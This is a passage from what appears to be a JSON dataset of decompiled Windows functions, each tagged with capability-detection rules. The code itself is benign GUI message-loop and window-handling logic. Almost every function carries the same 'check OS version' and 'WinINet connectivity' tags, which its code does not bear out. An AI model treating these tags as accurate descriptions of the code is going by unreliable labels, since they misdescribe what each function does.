            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00458de4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 == 0) {\n        return;\n    }\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0043fd08();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n            goto code_r0x00458e4d;\n        }\n    }\n    fcn.00457d4c();\ncode_r0x00458e4d:\n    uVar3 = (***0x461f44)(1, 0, 0, 0x40);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    uVar3 = (***0x461f44)(0, iVar1);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar1);\n    iVar1 = *(in_EAX + 0x44);\n    if (((iVar1 != 0) && (*(iVar1 + 0x22b) == '\\x01')) && (*(iVar1 + 0x57) == '\\0')) {\n        fcn.00453a58();\n        fcn.00455e74();\n    }\n    fcn.0045842c();\n    if (*(*0x463bb4 + 100) != 0) {\n        uVar2 = fcn.0043fd08();\n        sub.user32.dll_SetFocus(uVar2);\n    }\n    if (*(in_EAX + 0x122) != 0) {\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 575
    },
    "00458f20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00458f20(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack264 [256];\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        fcn.00403ffc();\n    }\n    else {\n        sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack264, 0x100);\n        fcn.00404098();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00458f90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00458f90(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x22f) == '\\x02')) && (*(*0x463bb4 + 0x6c) != 0)) &&\n       (*(*(*0x463bb4 + 0x6c) + 0x22f) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x254), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 187
    },
    "004590cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t fcn.004590cc(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    unkbyte3 Var4;\n    \n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar2 = fcn.0043fd08();\n        iVar3 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if ((iVar3 != 0) && (uVar2 = fcn.00403454(),  uVar2 != '\\0')) {\n            Var4 = uVar2 >> 8;\n            uVar1 = 1;\n            goto code_r0x00459129;\n        }\n    }\n    uVar1 = 0;\n    Var4 = 0;\ncode_r0x00459129:\n    return CONCAT14(uVar1, CONCAT31(Var4, uVar1));\n}\n",
        "token_count": 232
    },
    "00459138": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00459138(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0;\n    uVar4 = param_2;\n    iVar2 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1, param_1);\n    if (iVar2 != 0) {\n        uVar3 = 1;\n        if (*(param_2 + 4) == 0x12) {\n            *(in_EAX + 0x9c) = 1;\n        }\n        else {\n            uVar4 = uVar4 & 0xffffff00;\n            if (*(in_EAX + 0xda) != 0) {\n                (**(in_EAX + 0xd8))();\n            }\n            cVar1 = fcn.00459098();\n            if ((cVar1 == '\\0') && (uVar4 == '\\0')) {\n                cVar1 = fcn.00458f90();\n                if (cVar1 == '\\0') {\n                    cVar1 = fcn.00458fe0();\n                    if (cVar1 == '\\0') {\n                        cVar1 = fcn.00458f6c();\n                        if (cVar1 == '\\0') {\n                            sub.user32.dll_TranslateMessage(param_2);\n                            sub.user32.dll_DispatchMessageA();\n                            uVar4 = param_2;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return CONCAT44(uVar4, uVar3);\n}\n",
        "token_count": 371
    },
    "004591f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004591f4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.00413b44();\n        puVar1 = fcn.004026bc();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.00413a08();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00459250": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459250(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xa8) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00413b64();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.004026dc();\n                    fcn.00413a54();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "004592cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004592cc(void)\n\n{\n    if (**0x461ff4 != NULL) {\n        (***0x461ff4)();\n    }\n    return;\n}\n",
        "token_count": 38
    },
    "004592e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004592e4(int32_t **param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4592f7;\n    piVar2 = (**(param_2 + -0xc))();\n    *param_1 = piVar2;\n    uStack28 = 0x459322;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    (**(*piVar2 + 0x2c))();\n    *in_FS_OFFSET = uStack32;\n    if (*(in_EAX + 0x44) == 0) {\n        puStack24 = 0x45934b;\n        cVar1 = fcn.004033e4();\n        if (cVar1 != '\\0') {\n            puStack24 = 0x459358;\n            fcn.0043fce4();\n            *(in_EAX + 0x44) = piVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "00459364": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459364(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    *(in_EAX + 0xa5) = 1;\n    uStack28 = 0x459442;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x459390;\n    fcn.00407afc();\n    if (*(in_EAX + 0x44) != 0) {\n        if (**0x462058 == 3) {\n            puStack36 = 0x4593c0;\n            fcn.00453a58();\n        }\n        else if (**0x462058 == 7) {\n            *(*(in_EAX + 0x44) + 0x22b) = 1;\n        }\n        if (*(in_EAX + 0x5b) != '\\0') {\n            if (*(*(in_EAX + 0x44) + 0x22b) == '\\x01') {\n                puStack36 = 0x4593e0;\n                fcn.00458d34();\n            }\n            else {\n                puStack36 = 0x4593e9;\n                fcn.00452960();\n            }\n        }\n        do {\n            uStack40 = 0x459409;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            puStack36 = &stack0xfffffffc;\n            fcn.004591d0();\n            *in_FS_OFFSET = uStack44;\n        } while (*(in_EAX + 0x9c) == '\\0');\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0xa5) = 0;\n    return;\n}\n",
        "token_count": 454
    },
    "00459464": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459464(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.0040274c();\n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.0040276c();\n        fcn.0040274c(uVar3);\n        fcn.0040b470();\n    }\n    else {\n        fcn.0040274c();\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xd2) == 0) {\n                fcn.0040274c();\n                fcn.0045965c();\n                return;\n            }\n            fcn.0040274c();\n            (**(in_EAX + 0xd0))();\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "0045965c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00459695)\n// WARNING: Removing unreachable block (ram,0x004596bc)\n\nvoid fcn.0045965c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x459717;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.00404040();\n    arg_8h = 0x10;\n    fcn.00458f20();\n    uVar1 = fcn.00404468();\n    fcn.00404468(uVar1);\n    fcn.004594f4(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x45971e;\n    uStack288 = 0x45970e;\n    fcn.00403fa8();\n    uStack288 = 0x459716;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 280
    },
    "00459734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00459734(uint param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    uint uVar5;\n    char acStack20 [4];\n    \n    uVar5 = 0;\n    acStack20[0] = '\\x01';\n    iVar1 = *(*0x463bb4 + 0x68);\n    if ((iVar1 == 0) || (*(iVar1 + 0x2aa) == 0)) {\n        if (*(in_EAX + 0xf2) != 0) {\n            uVar5 = (**(in_EAX + 0xf0))(acStack20);\n        }\n    }\n    else {\n        uVar5 = (**(iVar1 + 0x2a8))(acStack20);\n    }\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x1c) & 0x10) != 0) {\n            acStack20[0] = '\\0';\n        }\n        iVar3 = fcn.0043fea4();\n        if (((iVar3 == -1) && (*(iVar1 + 0x57) == '\\0')) && (*(iVar1 + 0x220) == 0)) {\n            acStack20[0] = '\\0';\n        }\n    }\n    if ((acStack20[0] != '\\0') && (uVar5 == '\\0')) {\n        if ((iVar1 != 0) && ((cVar2 = fcn.0044000c(),  cVar2 != '\\0' && (*(iVar1 + 0x23c) != 0)))) {\n            fcn.0043fd08();\n            uVar4 = fcn.00459dd8();\n            if (uVar4 == '\\0') {\n                return uVar5;\n            }\n            uVar5 = (**(**(in_EAX + 0x4c) + 0x20))(param_1, uVar4 & 0xffff0000 | param_2);\n            return uVar5;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xa4) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2, param_1);\n            }\n        }\n        else {\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.0043fd08();\n            }\n            uVar4 = fcn.00459dd8();\n            if (uVar4 != '\\0') {\n                uVar5 = (**(**(in_EAX + 0x4c) + 0x20))(param_1, uVar4 & 0xffff0000 | param_2);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 655
    },
    "00459a28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00459a28(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack20 [8];\n    \n    sub.user32.dll_GetCursorPos();\n    iVar1 = fcn.00437dd8();\n    iVar2 = fcn.004366d4();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        if (((*(in_EAX + 0x48) != 0) && (iVar2 == 0)) || ((iVar2 != 0 && (iVar2 == *(in_EAX + 0x48))))) {\n            fcn.0043a6d4(0);\n        }\n        *(in_EAX + 0x48) = iVar1;\n        if (((*(in_EAX + 0x48) != 0) && (iVar2 == 0)) || ((iVar2 != 0 && (iVar2 == *(in_EAX + 0x48))))) {\n            fcn.0043a6d4(0);\n        }\n    }\n    return CONCAT44(auStack20, iVar1);\n}\n",
        "token_count": 251
    },
    "00459aa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459aa0(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x459bb0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x459aca;\n    fcn.00459a28();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x459ae9;\n        fcn.00459ff8();\n    }\n    puStack48 = 0x459af3;\n    fcn.00457ad8();\n    puStack48 = 0x459afe;\n    fcn.0043663c();\n    puStack48 = 0x459b0b;\n    fcn.00459c60();\n    bVar1 = true;\n    uStack52 = 0x459b57;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x102) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x100))();\n    }\n    fcn.004599c4();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x459b71;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x46220c) {\n        puStack48 = 0x459b82;\n        cVar2 = fcn.0041937c();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x459b95;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x459bb7;\n    uStack40 = 0x459baf;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 568
    },
    "00459c60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459c60(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x459c74;\n    fcn.004043b4();\n    if (!in_ZF) {\n        puStack20 = 0x459c80;\n        fcn.00403ffc();\n        if (*(in_EAX + 0xfa) == 0) {\n            puStack20 = 0x459ca8;\n            fcn.00433248();\n            puStack20 = 0x459cb5;\n            fcn.00445f38();\n            uStack24 = 0x459ce5;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.00403454();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x459cec;\n            uStack24 = 0x459ce4;\n            fcn.00403258();\n            return;\n        }\n        puStack20 = 0x459c98;\n        (**(in_EAX + 0xf8))();\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "00459d50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459d50(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00456f54();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00456f40();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 400) == 0) || (cVar1 = fcn.0044000c(),  cVar1 != '\\0')) {\ncode_r0x00459db7:\n                        fcn.00459cf4(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.0043fd08(*(iVar3 + 400));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x00459db7;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00459cf4(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00459dd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00459dd8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.00405648();\n        fcn.00424d7c();\n    }\n    return *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 77
    },
    "00459e00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459e00(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.00459e44();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.00457b30);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.00459ff8();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00459e6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459e6c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint32_t uStack32;\n    uint uStack28;\n    \n    uStack52 = 0x459e85;\n    fcn.00406960();\n    uStack52 = 0x459e94;\n    fcn.00439044();\n    uStack52 = 0x459e9f;\n    fcn.00437dd8();\n    uStack52 = 0x459ea4;\n    iVar1 = fcn.00457b10();\n    if ((iVar1 == 0) || (*(iVar1 + 0x99) == '\\0')) {\n        uStack52 = 0x459eba;\n        fcn.00459ff8();\n    }\n    else {\n        if (iVar1 == *(in_EAX + 0x60)) {\n            uStack52 = 0x459ed0;\n            fcn.00406960();\n            uStack52 = 0x459edf;\n            fcn.00439044();\n            uStack52 = uStack28;\n            uStack56 = uStack32;\n            uStack60 = in_EAX + 100;\n            iVar2 = sub.user32.dll_PtInRect();\n            if (iVar2 != 0) {\n                return;\n            }\n        }\n        puVar3 = &stack0xffffffc4;\n        uStack56 = uStack56 & 0xffffff00 | *(in_EAX + 0x58);\n        if (*(in_EAX + 0x58) == 0) {\n            uStack60 = *(in_EAX + 0x78);\n        }\n        else {\n            uStack60 = *(in_EAX + 0x80);\n        }\n        fcn.0043a6d4(&stack0xffffffc4);\n        if ((uStack60 == '\\0') || (puVar3 != NULL)) {\n            fcn.00459ff8();\n            *(in_EAX + 0x58) = uStack60;\n            *(in_EAX + 0x60) = iVar1;\n            fcn.00459e00();\n        }\n        else {\n            *(in_EAX + 0x58) = uStack60;\n            *(in_EAX + 0x60) = iVar1;\n            sub.user32.dll_GetCursorPos(&stack0xffffffc5);\n            fcn.0045a290();\n        }\n    }\n    return;\n}\n",
        "token_count": 572
    },
    "00459ff8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459ff8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.00459fb4();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00457c98();\n        fcn.00459e44();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0045a030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0045a030(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x45a044;\n    var_4h = (***0x461f44)();\n    puStack64 = &fcn.0045a030::var_28h;\n    uStack68 = 0x45a050;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x45a056;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x45a172;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x45a07a;\n        puStack72 = &stack0xfffffffc;\n        fcn.0041eaa4();\n        puStack84 = 0x45a085;\n        iVar2 = fcn.00407ab0();\n        uStack88 = 0x45a143;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.0041eb5c(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.0045a020();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.0045a020();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x45a14a;\n        iStack92 = 0x45a142;\n        iVar2 = fcn.004026dc();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 733
    },
    "0045a1e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
